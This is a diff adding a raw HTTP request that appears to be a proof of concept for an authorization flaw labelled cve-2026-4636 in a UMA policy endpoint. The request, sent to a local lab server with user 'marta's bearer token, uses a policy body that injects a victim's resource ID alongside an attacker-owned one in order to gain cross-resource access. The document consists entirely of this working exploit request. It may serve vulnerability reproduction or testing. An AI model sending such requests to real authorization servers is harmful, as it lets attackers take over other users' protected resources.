@@ -1,0 +1,18 @@
+POST http://127.0.0.1:8080/realms/anypoc/authz/protection/uma-policy/dee75647-d81f-4922-8990-26589e20aca4 HTTP/1.1
+Authorization: Bearer <marta access token>
+Content-Type: application/json
+
+{
+  "description": "URL resource is attacker-owned, body injects victim resource",
+  "name": "cve-2026-4636-cross-resource-1788600912",
+  "resources": [
+    "dee75647-d81f-4922-8990-26589e20aca4",
+    "f1aeb616-8c98-4cb9-879e-d454d935ef23"
+  ],
+  "scopes": [
+    "Scope A"
+  ],
+  "users": [
+    "marta"
+  ]
+}
